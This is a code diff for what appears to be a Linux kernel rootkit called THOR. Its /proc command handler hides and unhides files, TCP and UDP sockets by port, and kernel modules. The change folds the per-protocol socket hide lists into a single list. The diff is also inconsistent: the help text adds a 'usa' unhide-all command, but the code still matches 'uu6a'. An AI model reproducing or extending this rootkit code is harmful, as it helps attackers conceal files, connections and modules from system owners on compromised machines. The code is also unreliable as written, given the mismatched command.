@@ -58,16 +58,13 @@ static int procfile_read(struct seq_file *m, void *v)
         "   echo ufa > /proc/" THOR_PROCFILE " (unhide all files)\n"\
         "   echo ht4s PORT > /proc/" THOR_PROCFILE " (hide tcp4 socket)\n"\
         "   echo ut4s PORT > /proc/" THOR_PROCFILE " (unhide tcp4 socket)\n"\
-        "   echo ut4a > /proc/" THOR_PROCFILE " (unhide all tcp4 sockets)\n"\
         "   echo ht6s PORT > /proc/" THOR_PROCFILE " (hide tcp6 socket)\n"\
         "   echo ut6s PORT > /proc/" THOR_PROCFILE " (unhide tcp6 socket)\n"\
-        "   echo ut6a > /proc/" THOR_PROCFILE " (unhide all tcp6 sockets)\n"\
         "   echo hu4s PORT > /proc/" THOR_PROCFILE " (hide udp4 socket)\n"\
         "   echo uu4s PORT > /proc/" THOR_PROCFILE " (unhide udp4 socket)\n"\
-        "   echo uu4a > /proc/" THOR_PROCFILE " (unhide all udp4 sockets)\n"\
         "   echo hu6s PORT > /proc/" THOR_PROCFILE " (hide udp6 socket)\n"\
         "   echo uu6s PORT > /proc/" THOR_PROCFILE " (unhide udp6 socket)\n"\
-        "   echo uu6a > /proc/" THOR_PROCFILE " (unhide all udp6 sockets)\n"\
+        "   echo usa > /proc/" THOR_PROCFILE " (unhide all sockets)\n"\
         "   echo hm MODULE > /proc/" THOR_PROCFILE " (hide module)\n"\
         "   echo um MODULE > /proc/" THOR_PROCFILE " (unhide module)\n"\
         "   echo uma > /proc/" THOR_PROCFILE " (unhide all modules)\n"\
@@ -104,64 +101,58 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
-        add_to_tcp4_list((int) port);
+        add_to_socket_list((int) port, tcp4);
     } else if (strncmp(buffer, "ut4s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
-        remove_from_tcp4_list((int) port);
-    } else if (strncmp(buffer, "ut4a", MIN(4, count)) == 0) {
-        clear_tcp4_list();
+        remove_from_socket_list((int) port, tcp4);
     } else if (strncmp(buffer, "ht6s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
-        add_to_tcp6_list((int) port);
+        add_to_socket_list((int) port, tcp6);
     } else if (strncmp(buffer, "ut6s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
-        remove_from_tcp6_list((int) port);
-    } else if (strncmp(buffer, "ut6a", MIN(4, count)) == 0) {
-        clear_tcp6_list();
+        remove_from_socket_list((int) port, tcp6);
     } else if (strncmp(buffer, "hu4s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
-        add_to_udp4_list((int) port);
+        add_to_socket_list((int) port, udp4);
     } else if (strncmp(buffer, "uu4s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
-        remove_from_udp4_list((int) port);
-    } else if (strncmp(buffer, "uu4a", MIN(4, count)) == 0) {
-        clear_udp4_list();
+        remove_from_socket_list((int) port, udp4);
     } else if (strncmp(buffer, "hu6s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
-        add_to_udp6_list((int) port);
+        add_to_socket_list((int) port, udp6);
     } else if (strncmp(buffer, "uu6s ", MIN(5, count)) == 0) {
         long port;
         char s_port[12];
         strncpy(s_port, buffer+5, MIN(12, count - 5));
         s_port[MIN(12, count-5)-1] = 0;
         r = kstrtol(s_port, 10, &port);
-        remove_from_udp6_list((int) port);
+        remove_from_socket_list((int) port, udp6);
     } else if (strncmp(buffer, "uu6a", MIN(4, count)) == 0) {
-        clear_udp6_list();
+        clear_socket_list();
     } else if (strncmp(buffer, "hm ", MIN(3, count)) == 0) {
         add_to_module_list(buffer + 3, count - 3);
     } else if (strncmp(buffer, "uma", MIN(3, count)) == 0) {
